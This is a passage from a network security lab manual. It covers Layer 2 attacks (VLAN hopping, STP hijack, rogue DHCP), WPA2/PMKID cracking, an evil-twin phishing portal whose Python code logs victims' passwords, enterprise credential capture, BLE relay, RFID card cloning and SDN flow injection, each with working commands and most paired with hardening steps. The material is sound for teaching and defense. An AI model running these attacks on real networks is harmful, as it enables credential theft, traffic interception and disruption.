# While flooding continues, generate traffic between VM1 and VM3
# On VM1: ping 10.9.2.30
# On VM2 (attacker): sniff for traffic between them
tcpdump -i eth0 -c 50 'host 10.9.2.10 and host 10.9.2.30'
# Expected: ICMP packets between VM1 and VM3 are now visible
# because the switch is flooding all ports
```

**Step 4 — Port security defense:**

```text
! On the switch (Cisco IOS)
interface GigabitEthernet0/5
 switchport mode access
 switchport port-security
 switchport port-security maximum 3
 switchport port-security violation shutdown
 switchport port-security mac-address sticky

! Verify
show port-security interface GigabitEthernet0/5
! Expected: port goes err-disabled after 4th unique MAC
```

**Step 5 — Verify port security blocks the attack:**

```bash
# Re-run MAC flood — port should shut down
macof -i eth0
# Expected: switch port enters err-disabled state
# Switch log: %PORT_SECURITY-2-PSECURE_VIOLATION: ...

# Recover the port (switch admin):
# interface GigabitEthernet0/5
#  shutdown
#  no shutdown
```

---

### Exercise 3: VLAN Hopping (DTP + Double Tagging)

**Objective:** Exploit DTP to negotiate a trunk, then use double-tagging to reach a target VLAN from an access port.

**Step 1 — DTP trunk negotiation (VM2):**

```bash
# Send DTP desirable frames to negotiate trunk
python3 /opt/attacks/l2/vlan_hop.py dtp -i eth0 -c 50

# Alternative: yersinia
yersinia dtp -attack 1 -interface eth0
```

**Step 2 — Verify trunk formation (VM2):**

```bash
# If trunk formed, create VLAN sub-interfaces
modprobe 8021q

python3 /opt/attacks/l2/vlan_hop.py vlan-iface \
    -i eth0 --vlan 20 --ip 10.20.0.100/24

python3 /opt/attacks/l2/vlan_hop.py vlan-iface \
    -i eth0 --vlan 30 --ip 10.30.0.100/24

# Verify
ip -d link show eth0.20
ip -d link show eth0.30

# Attempt to reach hosts on VLAN 20
ping -c 3 10.20.0.1
```

**Step 3 — Double tagging (VM2, if DTP fails):**

```bash
# Requires: attacker port on native VLAN (e.g., VLAN 1)
# Target: VLAN 20

python3 /opt/attacks/l2/vlan_hop.py doubletag \
    -i eth0 --native 1 --target 20 --dst 10.20.0.50

# On VM1 (if on VLAN 20): listen for the packet
tcpdump -i eth0 -nn 'icmp'
# Expected: ICMP packet arrives even though attacker is on VLAN 1/10
```

**Step 4 — Scapy double-tag verification:**

```python
# On VM2
from scapy.all import *

# Craft and send double-tagged frame
pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / \
      Dot1Q(vlan=1) / \
      Dot1Q(vlan=20) / \
      IP(dst="10.20.0.50") / \
      ICMP() / \
      Raw(load=b"VLAN_HOP_PROOF")

sendp(pkt, iface="eth0", verbose=True)

# Verify with Wireshark on target VLAN
# Filter: icmp && data contains "VLAN_HOP_PROOF"
```

**Hardening verification:**

```text
! Apply VLAN hopping prevention
interface range GigabitEthernet0/1 - 48
 switchport mode access
 switchport nonegotiate          ! Disable DTP

interface GigabitEthernet0/49
 switchport mode trunk
 switchport nonegotiate
 switchport trunk native vlan 999  ! Move native to unused VLAN
 switchport trunk allowed vlan 10,20,30  ! Explicit whitelist

! Enable native VLAN tagging
vlan dot1q tag native
```

---

### Exercise 4: STP Root Bridge Hijack

**Objective:** Claim the STP root bridge role by injecting BPDUs with priority 0, causing traffic to reroute through the attacker.

**Step 1 — Monitor existing STP topology (VM2):**

```bash
python3 /opt/attacks/l2/stp_attack.py monitor -i eth0 -d 30

# Expected output:
# [BPDU] Bridge: 32768:<switch_mac>
#        Root:   32768:<switch_mac>
#        Cost:   0
# Current root: 32768:<switch_mac>
```

**Step 2 — Claim root bridge (VM2):**

```bash
# Method A: Custom script
python3 /opt/attacks/l2/stp_attack.py root -i eth0 -d 60

# Method B: yersinia
yersinia stp -attack 4 -interface eth0
```

**Step 3 — Verify root bridge change (on switch):**

```text
show spanning-tree
! Expected: Root Bridge ID should now show priority 0
! and the attacker's MAC address
! All ports recalculate paths through attacker
```

**Step 4 — TCN flood for disruption (VM2):**

```bash
python3 /opt/attacks/l2/stp_attack.py tcn -i eth0 -d 30
# TCN forces all switches to reduce MAC aging timer
# Increases broadcast traffic, potential connectivity flapping
```

**Hardening:**

```text
! BPDU Guard on all access ports
spanning-tree portfast bpduguard default

interface range GigabitEthernet0/1 - 48
 spanning-tree portfast
 spanning-tree bpduguard enable

! Root Guard on designated ports toward edge
interface GigabitEthernet0/49
 spanning-tree guard root

! Set legitimate switch as root with lowest priority
spanning-tree vlan 1-4094 priority 0
```

---

### Exercise 5: DHCP Starvation and Rogue DHCP Server

**Objective:** Exhaust the legitimate DHCP pool, then deploy a rogue DHCP server that directs victims to use the attacker as their gateway.

**Step 1 — DHCP starvation (VM2):**

```bash
python3 /opt/attacks/l2/dhcp_attack.py starve -i eth0 -c 254

# Alternative: yersinia
yersinia dhcp -attack 1 -interface eth0
```

**Step 2 — Verify starvation (VM1):**

```bash
# Release current DHCP lease
dhclient -r eth0

# Try to get new lease
dhclient -v eth0
# Expected: DHCPDISCOVER times out — no addresses available
```

**Step 3 — Launch rogue DHCP server (VM2):**

```bash
# Enable IP forwarding (attacker becomes gateway)
echo 1 > /proc/sys/net/ipv4/ip_forward

# Start rogue DHCP
python3 /opt/attacks/l2/dhcp_attack.py rogue \
    -i eth0 \
    --pool-start 10.9.2.100 \
    --pool-end 10.9.2.200 \
    --gateway 10.9.2.20 \
    --dns 10.9.2.20
```

**Step 4 — Victim connects to rogue DHCP (VM1):**

```bash
dhclient -v eth0
# Expected: receives IP from attacker's rogue server
# Gateway = 10.9.2.20 (attacker)
# DNS = 10.9.2.20 (attacker)

ip route show default
# Expected: default via 10.9.2.20
```

**Step 5 — Verify MitM position (VM2):**

```bash
# All victim traffic now routes through attacker
tcpdump -i eth0 -n host 10.9.2.100
# Captures all victim's outbound traffic
```

**Hardening — DHCP snooping:**

```text
ip dhcp snooping
ip dhcp snooping vlan 10

interface GigabitEthernet0/1
 ip dhcp snooping trust  ! Uplink to legitimate DHCP server

interface range GigabitEthernet0/2 - 48
 ip dhcp snooping limit rate 10  ! Rate limit on access ports

show ip dhcp snooping binding
```

---

### Exercise 6: WiFi WPA2 Handshake Capture and PMKID Attack

> **Requires physical WiFi adapters with monitor mode support.**

**Objective:** Capture a WPA2 4-way handshake via deauthentication, and independently extract the PMKID for clientless cracking.

**Step 1 — Enable monitor mode (VM4):**

```bash
# Kill interfering processes
airmon-ng check kill

# Enable monitor mode
airmon-ng start wlan0
# Interface becomes wlan0mon

# Verify
iwconfig wlan0mon
# Expected: Mode:Monitor
```

**Step 2 — Scan for target AP:**

```bash
airodump-ng wlan0mon

# Note target AP details:
# BSSID: AA:BB:CC:DD:EE:FF
# Channel: 6
# ESSID: LabWiFi
# ENC: WPA2
# AUTH: PSK
# Also note associated client MAC: 11:22:33:44:55:66
```

**Step 3 — Capture handshake via deauth:**

```bash
# Terminal 1: capture on target channel
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon

# Terminal 2: deauth client to force re-association
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Wait for "WPA handshake: AA:BB:CC:DD:EE:FF" in airodump-ng output
# Captured in handshake-01.cap
```

**Step 4 — Crack handshake:**

```bash
# aircrack-ng (CPU)
aircrack-ng -w /usr/share/wordlists/rockyou.txt \
    -b AA:BB:CC:DD:EE:FF handshake-01.cap

# hashcat (GPU — convert format first)
hcxpcapngtool -o hash.22000 handshake-01.cap
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt
```

**Step 5 — PMKID capture (clientless):**

```bash
# No client needed — extracts PMKID from AP's first EAPOL message
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1 \
    --filterlist_ap=AA:BB:CC:DD:EE:FF --filtermode=2

# Wait 30-60 seconds for PMKID capture
# Extract hash
hcxpcapngtool -o pmkid_hash.22000 pmkid.pcapng

# Crack
hashcat -m 22000 pmkid_hash.22000 /usr/share/wordlists/rockyou.txt
```

**Expected result:** PSK recovered. Both methods yield the same passphrase.

**Defense analysis:**

```
PMKID attack advantages:
  - No client needed (works on networks with no active stations)
  - No deauthentication (stealthier — no 802.11w defense helps)
  - Single frame capture

Defense:
  - Strong passphrase (20+ chars, random)
  - WPA3-SAE (immune to offline dictionary attack)
  - 802.11w/PMF (protects against deauth, but NOT PMKID)
  - WIDS monitoring for PMKID extraction attempts (hcxdumptool patterns)
```

---

### Exercise 7: Evil Twin with Captive Portal

**Objective:** Deploy a rogue AP impersonating a legitimate network, capture credentials via a phishing captive portal, and demonstrate KARMA attack behavior.

**Step 1 — Evil twin AP (VM4):**

```bash
# Kill interfering processes
airmon-ng check kill

# Configure hostapd-mana
cat > /tmp/evil_twin.conf << 'CONF'
interface=wlan0
driver=nl80211
ssid=FreeWiFi_Lab
channel=6
hw_mode=g
ieee80211n=1

# Open network (for captive portal)
auth_algs=1
wpa=0

# KARMA — respond to ALL probe requests
enable_mana=1
mana_loud=1
CONF

# Start evil twin
hostapd-mana /tmp/evil_twin.conf &
```

**Step 2 — Network infrastructure for victims:**

```bash
# Assign IP to WiFi interface
ip addr add 10.0.0.1/24 dev wlan0

# DHCP + DNS for victims
dnsmasq --interface=wlan0 \
    --dhcp-range=10.0.0.10,10.0.0.200,12h \
    --dhcp-option=3,10.0.0.1 \
    --dhcp-option=6,10.0.0.1 \
    --address=/#/10.0.0.1 \
    --no-daemon --log-queries &

# NAT for internet access (make it convincing)
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Redirect HTTP/HTTPS to captive portal
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 \
    -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 \
    -j REDIRECT --to-port 8080
```

**Step 3 — Captive portal server:**

```python
#!/usr/bin/env python3
# /tmp/captive_portal.py
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
import datetime

PORTAL_HTML = """<!DOCTYPE html>
<html><head><title>WiFi Login Required</title>
<style>
body { font-family: Arial; display: flex; justify-content: center;
       align-items: center; min-height: 100vh; margin: 0;
       background: #f0f2f5; }
.card { background: white; padding: 2rem; border-radius: 8px;
        box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 400px; }
h2 { color: #1a73e8; }
input { width: 100%; padding: 10px; margin: 5px 0 15px; border: 1px solid #ddd;
        border-radius: 4px; box-sizing: border-box; }
button { width: 100%; padding: 10px; background: #1a73e8; color: white;
         border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
</style></head>
<body><div class="card">
<h2>Free WiFi Access</h2>
<p>Sign in to access the internet</p>
<form method="POST" action="/login">
<input name="email" type="email" placeholder="Email" required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Connect</button>
</form>
<p style="font-size:12px;color:#666">By connecting you agree to our terms</p>
</div></body></html>"""

class PortalHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(PORTAL_HTML.encode())

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode()
        params = urllib.parse.parse_qs(body)
        email = params.get('email', [''])[0]
        password = params.get('password', [''])[0]
        ts = datetime.datetime.now(datetime.timezone.utc).isoformat()
        print(f"\n[CAPTURED] {ts}")
        print(f"  Email:    {email}")
        print(f"  Password: {password}")
        print(f"  Source:   {self.client_address[0]}")

        with open('/tmp/captured_creds.txt', 'a') as f:
            f.write(f"{ts}|{self.client_address[0]}|{email}|{password}\n")

        self.send_response(302)
        self.send_header('Location', 'http://www.example.com')
        self.end_headers()

    def log_message(self, format, *args):
        pass

print("[*] Captive portal on :8080")
HTTPServer(('0.0.0.0', 8080), PortalHandler).serve_forever()
```

```bash
python3 /tmp/captive_portal.py &
```

**Step 4 — Client connects:**

When a victim device connects to "FreeWiFi_Lab" and opens a browser, they are redirected to the captive portal. Any credentials entered are logged.

**Step 5 — KARMA verification:**

```bash
# With mana_loud=1, the AP responds to ALL probe requests
# Monitor hostapd-mana output for:
# MANA: Responding to probe request for 'HomeNetwork' from 11:22:33:44:55:66
# MANA: Responding to probe request for 'OfficeWiFi' from AA:BB:CC:DD:EE:FF
```

**Detection (VM3 or WIDS):**

```bash
# Kismet as WIDS
kismet -c wlan1mon --override wardrive

# Alert types to watch:
# APSPOOF — same SSID on different BSSID (evil twin indicator)
# DEAUTHFLOOD — excessive deauth frames
# BSSTIMESTAMP — BSS timestamp anomaly
```

---

### Exercise 8: WPA2-Enterprise Credential Capture

> **Requires: WiFi adapter with AP mode support.**

**Objective:** Deploy a fake WPA2-Enterprise AP using hostapd-mana to capture MSCHAPv2 credentials from EAP-PEAP sessions, then crack the captured hash.

**Step 1 — Generate self-signed certificates:**

```bash
mkdir -p /tmp/certs && cd /tmp/certs

# CA key and cert
openssl req -x509 -newkey rsa:2048 -keyout ca.key -out ca.pem \
    -days 365 -nodes -subj "/CN=FakeCorpCA"

# Server key and CSR
openssl req -newkey rsa:2048 -keyout server.key -out server.csr \
    -nodes -subj "/CN=radius.corp.local"

# Sign server cert
openssl x509 -req -in server.csr -CA ca.pem -CAkey ca.key \
    -CAcreateserial -out server.pem -days 365

# DH parameters
openssl dhparam -out dh.pem 2048
```

**Step 2 — Configure hostapd-mana for EAP capture:**

```bash
cat > /tmp/enterprise_evil.conf << 'CONF'
interface=wlan0
driver=nl80211
ssid=CorpNet
channel=1
hw_mode=g
ieee80211n=1

wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
ieee8021x=1
eap_server=1
eap_user_file=/tmp/enterprise_users.conf

ca_cert=/tmp/certs/ca.pem
server_cert=/tmp/certs/server.pem
private_key=/tmp/certs/server.key
dh_file=/tmp/certs/dh.pem

# Credential capture
mana_wpe=1
mana_credout=/tmp/enterprise_creds.txt
CONF

cat > /tmp/enterprise_users.conf << 'USERS'
* PEAP,TTLS,TLS,FAST
"t" TTLS-MSCHAPV2,MSCHAPV2,MD5,GTC,TTLS-PAP,TTLS-CHAP "password" [2]
USERS
```

**Step 3 — Launch fake AP:**

```bash
hostapd-mana /tmp/enterprise_evil.conf

# Output when client connects:
# mana_wpe: username=jsmith
# mana_wpe: challenge=ab:cd:ef:01:23:45:67:89
# mana_wpe: response=de:ad:be:ef:ca:fe:ba:be:01:23:45:67:89:ab:cd:ef:de:ad:be:ef:ca:fe:ba:be
```

**Step 4 — Crack captured MSCHAPv2:**

```bash
# Method A: asleap
asleap -C ab:cd:ef:01:23:45:67:89 \
       -R de:ad:be:ef:ca:fe:ba:be:01:23:45:67:89:ab:cd:ef:de:ad:be:ef:ca:fe:ba:be \
       -W /usr/share/wordlists/rockyou.txt

# Method B: hashcat
# Convert to NetNTLMv1 format (mode 5500)
hashcat -m 5500 /tmp/enterprise_creds.txt \
    /usr/share/wordlists/rockyou.txt
```

**Defense analysis:**

```
Why this works:
  - Clients configured to accept ANY server certificate
  - EAP-PEAP/MSCHAPv2 sends password hash inside TLS tunnel
  - MSCHAPv2 is crackable (DES-based, effectively 2×56-bit keys)

Mitigations:
  1. Pin RADIUS server CA certificate in supplicant config
  2. Validate CN/SAN of server certificate
  3. Use EAP-TLS (mutual certificate auth) — no password hash sent
  4. Deploy 802.11w PMF (prevents deauth to force re-association)
  5. WIDS: alert on duplicate SSID from unknown BSSID
```

---

### Exercise 9: BLE Reconnaissance and GATT Enumeration

> **Requires: Bluetooth adapter (CSR-based USB dongle or built-in) + nRF52840 for sniffing.**

**Objective:** Enumerate BLE devices, explore GATT services and characteristics, and demonstrate BLE relay attack concepts.

**Step 1 — Bluetooth reconnaissance (VM4):**

```bash
# BR/EDR discovery
hcitool scan
# Returns: AA:BB:CC:DD:EE:FF  DeviceName

# BLE scanning
hcitool lescan
# Returns BLE advertisement addresses and names

# Detailed device info
hcitool info AA:BB:CC:DD:EE:FF

# Service discovery (SDP)
sdptool browse AA:BB:CC:DD:EE:FF
```

**Step 2 — Bettercap BLE recon:**

```bash
bettercap
> ble.recon on
# Lists all discovered BLE devices with:
# Address, Name, RSSI, Connectable, Vendor

> ble.show
# Detailed view of all discovered BLE peripherals

> ble.enum AA:BB:CC:DD:EE:FF
# Enumerates GATT services and characteristics
```

**Step 3 — GATT enumeration with gatttool:**

```bash
# List primary services
gatttool -b AA:BB:CC:DD:EE:FF --primary

# List characteristics
gatttool -b AA:BB:CC:DD:EE:FF --characteristics

# Read a specific characteristic
gatttool -b AA:BB:CC:DD:EE:FF --char-read -a 0x0003

# Interactive mode
gatttool -b AA:BB:CC:DD:EE:FF -I
[AA:BB:CC:DD:EE:FF][LE]> connect
[AA:BB:CC:DD:EE:FF][LE]> primary
# attr handle: 0x0001, end grp handle: 0x0005 uuid: 00001800-...
# attr handle: 0x0014, end grp handle: 0x001a uuid: 0000180f-... (Battery)

[AA:BB:CC:DD:EE:FF][LE]> characteristics
# handle: 0x0015, char properties: 0x02, char value handle: 0x0016, uuid: 00002a19-...

[AA:BB:CC:DD:EE:FF][LE]> char-read-hnd 0x0016
# Characteristic value at handle 0x0016: 64  (battery level: 100%)

# Write to a characteristic (e.g., toggle LED)
[AA:BB:CC:DD:EE:FF][LE]> char-write-req 0x000e 0100
```

**Step 4 — BLE sniffing with nRF52840:**

```bash
# Install nRF Sniffer for Wireshark (Nordic Semiconductor)
# Flash nRF52840 dongle with sniffer firmware

# In Wireshark:
# Interface → nRF Sniffer for Bluetooth LE
# Select target device by address
# Start capture

# Useful Wireshark filters:
# btle                                          — all BLE frames
# btle.advertising_address == aa:bb:cc:dd:ee:ff — specific device
# btatt                                         — ATT protocol
# btatt.opcode == 0x0b                          — read responses
# btsmp                                         — pairing/security
```

**Step 5 — BLE relay concept (GATTacker):**

```bash
# Device near target (smart lock, fitness tracker):
cd /opt/GATTacker
node scan.js                          # discover target BLE device
node advertise.js -a AA:BB:CC:DD:EE:FF  # clone and advertise

# Device near legitimate phone/keyfob:
# GATTacker relays GATT operations between the two endpoints
# The target device believes the legitimate phone is nearby
```

**Step 6 — KNOB attack analysis (conceptual):**

```bash
# Monitor Bluetooth HCI for encryption key size negotiation
btmon &

# Establish Bluetooth connection
# Watch for LMP_accepted with encryption key size
# If key_size < 7 bytes → KNOB vulnerability present

# Hardening:
# - Update firmware to enforce minimum 7-byte key entropy
# - Enable Secure Connections mode
# - Bluetooth Core Spec 5.1+ mitigates KNOB
```

---

### Exercise 10: RFID/NFC Card Cloning with Proxmark3

> **Requires: Proxmark3 Easy or RDV4 hardware.**

**Objective:** Read, analyze, and clone MIFARE Classic and 125 kHz proximity cards using the Proxmark3.

**Step 1 — 125 kHz card cloning (trivially insecure):**

```bash
# Start Proxmark3 CLI
proxmark3 /dev/ttyACM0

# Scan for 125 kHz card
proxmark3> lf search
# Expected: identifies card type (HID Prox, EM4100, etc.)

# Read HID Prox card
proxmark3> lf hid read
# Output: TAG ID: 2006XXXXXXXX

# Clone to T5577 writable card
proxmark3> lf hid clone --r 2006XXXXXXXX
# [+] Done

# Read EM4100 card
proxmark3> lf em 410x read
# Output: EM4100 Tag ID: 0102030405

# Clone EM4100
proxmark3> lf em 410x clone --id 0102030405
```

**Step 2 — MIFARE Classic key recovery:**

```bash
# Scan for 13.56 MHz card
proxmark3> hf search
# Expected: MIFARE Classic 1K detected

# Try default keys
proxmark3> hf mf chk *1 ? t
# Tests common default keys (FFFFFFFFFFFF, A0A1A2A3A4A5, etc.)

# Darkside attack (no known keys needed)
proxmark3> hf mf darkside
# Recovers first key via CRYPTO1 PRNG weakness

# Nested authentication (requires one known key)
proxmark3> hf mf nested --1k --blk 0 -a -k FFFFFFFFFFFF
# Derives keys for all other sectors

# Dump entire card
proxmark3> hf mf dump
# Saves to dumpdata.bin / dumpkeys.bin

# Write dump to blank MIFARE Classic
proxmark3> hf mf restore
```

**Step 3 — MIFARE Classic analysis:**

```bash
# View dump contents
proxmark3> hf mf view
# Shows all 16 sectors with keys and data

# Using mfoc (MIFARE Classic Offline Cracker) — alternative
mfoc -O card_dump.mfd

# Read dump file
hexdump -C card_dump.mfd | less
# Sector 0, Block 0: UID (4 bytes), manufacturer data
# Sector trailers (every 4th block): Key A (6B), Access Bits (4B), Key B (6B)
```

**Step 4 — EMV contactless analysis:**

```bash
# Read EMV contactless card (information only — no cloning possible)
proxmark3> hf emv search
proxmark3> hf emv readrecord

# Display PPSE (Proximity Payment System Environment)
proxmark3> hf emv pse

# Note: EMV cards use dynamic cryptograms — data alone cannot
# be used for fraudulent transactions at POS terminals
# However, PAN and expiry may be exposed (used for card-not-present fraud)
```

**Defense analysis:**

```
125 kHz (HID Prox, EM4100):
  - NO crypto whatsoever — trivially clonable with <$20 hardware
  - Upgrade to 13.56 MHz with AES (MIFARE DESFire EV2/EV3, SEOS)

MIFARE Classic:
  - CRYPTO1 cipher completely broken since 2008
  - All keys recoverable in minutes
  - Upgrade to DESFire EV2/EV3 (AES-128, diversified keys)

Physical controls:
  - Multi-factor: card + PIN
  - Anti-passback
  - Tamper-evident card readers
  - Video monitoring at access points
```

---

### Exercise 11: SDN Controller Exploitation

**Objective:** Exploit unauthenticated SDN controller APIs to enumerate the network, inject malicious flow rules, and demonstrate topology spoofing.

**Pre-check — Start SDN controller (VM5):**

```bash
/opt/sdn/start_controller.sh
# Verify: curl http://10.9.2.50:8080/stats/switches
```

**Step 1 — Enumerate Ryu controller (VM2):**

```bash
python3 /opt/attacks/sdn/sdn_attack.py enum-ryu \
    -u http://10.9.2.50:8080

# Expected output:
# [+] Connected switches: [1]
#     Switch 1: 5 flow rules
#       P=0 M={} A=[{'type': 'OUTPUT', 'port': 4294967293}]
#       P=1 M={'eth_dst': '...', 'eth_src': '...'} A=[{'type': 'OUTPUT', 'port': 2}]
#     Ports: 4
#
# [+] Topology links: 2
#     1:1 → 1:2
```

**Step 2 — Blackhole a host (VM2):**

```bash
# Drop all traffic to victim
python3 /opt/attacks/sdn/sdn_attack.py inject \
    -u http://10.9.2.50:8080 \
    --dpid 1 --target-ip 10.9.2.10 --action drop

# Verify (VM1 loses connectivity)
ping -c 3 10.9.2.1  # Times out
```

**Step 3 — Redirect traffic (VM2):**

```bash
# Redirect victim traffic to attacker's port
python3 /opt/attacks/sdn/sdn_attack.py inject \
    -u http://10.9.2.50:8080 \
    --dpid 1 --target-ip 10.9.2.10 --action redirect --port 3

# All traffic to VM1 now arrives at attacker's port
```

**Step 4 — Direct API exploitation (VM2):**

```bash
# Dump all flow rules
curl -s http://10.9.2.50:8080/stats/flow/1 | jq .

# Add malicious flow (mirror all HTTP to attacker)
curl -X POST http://10.9.2.50:8080/stats/flowentry/add \
    -H "Content-Type: application/json" \
    -d '{
        "dpid": 1,
        "table_id": 0,
        "priority": 999,
        "match": {"dl_type": 2048, "nw_proto": 6, "tp_dst": 80},
        "actions": [
            {"type": "OUTPUT", "port": 2},
            {"type": "OUTPUT", "port": 3}
        ]
    }'

# Delete the malicious rule
curl -X POST http://10.9.2.50:8080/stats/flowentry/delete \
    -H "Content-Type: application/json" \
    -d '{
        "dpid": 1,
        "table_id": 0,
        "priority": 999,
        "match": {"dl_type": 2048, "nw_proto": 6, "tp_dst": 80}
    }'
```

**Step 5 — LLDP topology spoofing (VM2):**

```bash
python3 /opt/attacks/sdn/sdn_attack.py lldp-spoof \
    -i eth0 --chassis fake-switch-01 --port-name eth0

# Verify: check controller's topology view
curl -s http://10.9.2.50:8080/v1.0/topology/links | jq .
# Expected: new fake link appears in topology
```

**Step 6 — OVS flow table exhaustion (VM2):**

```bash
python3 /opt/attacks/sdn/sdn_attack.py ovs-exhaust \
    -i eth0 --target 10.9.2.10 -c 200000

# Monitor on VM5:
ovs-dpctl show
ovs-appctl dpif-netdev/pmd-stats-show
ovs-dpctl dump-flows | wc -l
# Expected: flow count approaching cache limit, performance degradation
```

**Hardening:**

```bash
# 1. Enable TLS on OpenFlow channel
# Generate certs for switch and controller, configure mutual TLS

# 2. Secure controller API
# Add authentication (OAuth2, API keys, mutual TLS)
# Restrict API to management VLAN only

# 3. Change default credentials
# ODL: Change admin/admin
# ONOS: Change karaf/karaf

# 4. Network-isolate management plane
# Controller management interface on separate VLAN/VRF

# 5. Monitor flow table integrity
ovs-ofctl dump-flows br0 | md5sum  # periodic integrity check

# 6. LLDP authentication
# Enable HMAC-signed LLDP in controller (ONOS: lldp-provider app)
```

---

## PART B: DEFENSIVE (Protection Systems)

### Exercise 12: Comprehensive Layer 2 Hardening

**Objective:** Deploy a complete L2 security posture on a managed switch: port security, DHCP snooping, DAI, BPDU guard, DTP disablement, and VLAN hardening.

**Step 1 — Switch hardening script:**

```text
! ═══════════════════════════════════════════════════
!  COMPREHENSIVE L2 SECURITY TEMPLATE
!  Cisco IOS / IOS-XE
! ═══════════════════════════════════════════════════

! ── Global Settings ──
! Enable DHCP snooping
ip dhcp snooping
ip dhcp snooping vlan 10,20,30
ip dhcp snooping information option

! Enable ARP inspection (depends on DHCP snooping binding table)
ip arp inspection vlan 10,20,30
ip arp inspection validate src-mac dst-mac ip

! STP root bridge protection
spanning-tree portfast bpduguard default
spanning-tree loopguard default

! Tag native VLAN traffic on trunks
vlan dot1q tag native

! Disable unused VLANs
vlan 999
 name BLACKHOLE_NATIVE

! Disable CDP/LLDP globally (re-enable only where needed)
no cdp run
no lldp run

! ── Access Ports (user-facing) ──
interface range GigabitEthernet0/1 - 48
 ! Force access mode, disable trunk negotiation
 switchport mode access
 switchport access vlan 10
 switchport nonegotiate

 ! Port security
 switchport port-security
 switchport port-security maximum 3
 switchport port-security violation restrict
 switchport port-security aging time 60
 switchport port-security aging type inactivity
 switchport port-security mac-address sticky

 ! DHCP snooping rate limit
 ip dhcp snooping limit rate 10

 ! ARP inspection rate limit
 ip arp inspection limit rate 15

 ! STP PortFast + BPDU Guard
 spanning-tree portfast
 spanning-tree bpduguard enable

 ! Storm control (broadcast/multicast)
 storm-control broadcast level 10.00
 storm-control multicast level 10.00
 storm-control action shutdown

 ! No CDP/LLDP on access ports
 no cdp enable
 no lldp transmit
 no lldp receive

! ── Trunk Ports (inter-switch) ──
interface GigabitEthernet0/49
 switchport mode trunk
 switchport nonegotiate
 switchport trunk native vlan 999
 switchport trunk allowed vlan 10,20,30

 ! Trust DHCP on trunk (connects to DHCP server segment)
 ip dhcp snooping trust
 ip arp inspection trust

 ! Root guard on trunk toward edge
 spanning-tree guard root

 ! Enable CDP/LLDP only on trunks
 cdp enable
 lldp transmit
 lldp receive

! ── Uplink to DHCP Server ──
interface GigabitEthernet0/50
 ip dhcp snooping trust
 ip arp inspection trust

! ── 802.1X Authentication ──
aaa new-model
aaa authentication dot1x default group radius
aaa authorization network default group radius

radius server PRIMARY
 address ipv4 10.1.1.100 auth-port 1812 acct-port 1813
 key 7 <encrypted_key>

dot1x system-auth-control

interface range GigabitEthernet0/1 - 48
 authentication port-control auto
 authentication order dot1x mab
 authentication priority dot1x mab
 dot1x pae authenticator
 mab
 authentication host-mode single-host
 authentication timer reauthenticate 3600

! ── Verification Commands ──
! show ip dhcp snooping binding
! show ip arp inspection statistics
! show port-security
! show spanning-tree detail
! show dot1x all
```

**Step 2 — Verify each defense:**

```bash
# Test 1: MAC flood → port shuts down
macof -i eth0
# Expected: port enters err-disabled, syslog: %PORT_SECURITY-2-PSECURE_VIOLATION

# Test 2: ARP spoof → DAI drops packets
python3 /opt/attacks/l2/arp_spoof.py attack -i eth0 -v 10.9.2.10 -g 10.9.2.1
# Expected: DAI drops spoofed ARPs, no cache poisoning occurs
# Verify: show ip arp inspection statistics

# Test 3: DTP negotiation → blocked by switchport nonegotiate
yersinia dtp -attack 1 -interface eth0
# Expected: no trunk formed

# Test 4: BPDU injection → port disabled by BPDU Guard
python3 /opt/attacks/l2/stp_attack.py root -i eth0 -d 10
# Expected: port enters err-disabled
# Syslog: %SPANTREE-2-BLOCK_BPDUGUARD

# Test 5: DHCP starvation → rate-limited
python3 /opt/attacks/l2/dhcp_attack.py starve -i eth0 -c 254
# Expected: rate limit drops excess DHCP, syslog warning

# Test 6: Rogue DHCP → snooping drops offers from untrusted port
python3 /opt/attacks/l2/dhcp_attack.py rogue -i eth0 --pool-start 10.9.2.100 \
    --pool-end 10.9.2.200 --gateway 10.9.2.20 --dns 10.9.2.20
# Expected: DHCP offers from untrusted port dropped
```

---

### Exercise 13: Wireless Intrusion Detection and Response

**Objective:** Deploy and validate a Wireless IDS using Kismet, configure alert thresholds, and practice incident response for rogue AP and deauth attacks.

**Step 1 — Kismet WIDS deployment (VM3 with monitor-capable WiFi adapter):**

```bash
# Start Kismet in IDS mode
kismet -c wlan1mon --override wardrive

# Configure alerts (/etc/kismet/kismet_alerts.conf)
cat >> /etc/kismet/kismet_alerts.conf << 'ALERTS'
# Alert on SSID spoofing (different BSSID for known SSID)
alert=APSPOOF,5/min,1/sec

# Alert on deauth flood
alert=DEAUTHFLOOD,10/min,3/sec

# Alert on BSS timestamp anomaly (evil twin indicator)
alert=BSSTIMESTAMP,5/min,1/sec

# Alert on encryption downgrade
alert=CRYPTODROP,5/min,1/sec

# Alert on excessive probe response (KARMA)
alert=PROBERESPFLOOD,30/min,5/sec
ALERTS
```

**Step 2 — Define known AP inventory:**

```bash
# Create whitelist of authorized APs
cat > /etc/kismet/kismet_known_aps.conf << 'KNOWNAPS'
# Format: SSID,BSSID,Channel,Encryption
CorpNet,AA:BB:CC:01:01:01,1,WPA2-Enterprise
CorpNet,AA:BB:CC:01:01:02,6,WPA2-Enterprise
CorpNet,AA:BB:CC:01:01:03,11,WPA2-Enterprise
GuestWiFi,AA:BB:CC:02:02:01,6,WPA2-PSK
KNOWNAPS
```

**Step 3 — Trigger alerts with test attacks (VM4):**

```bash
# Test A: Evil twin
hostapd-mana /tmp/evil_twin.conf  # SSID: CorpNet, different BSSID
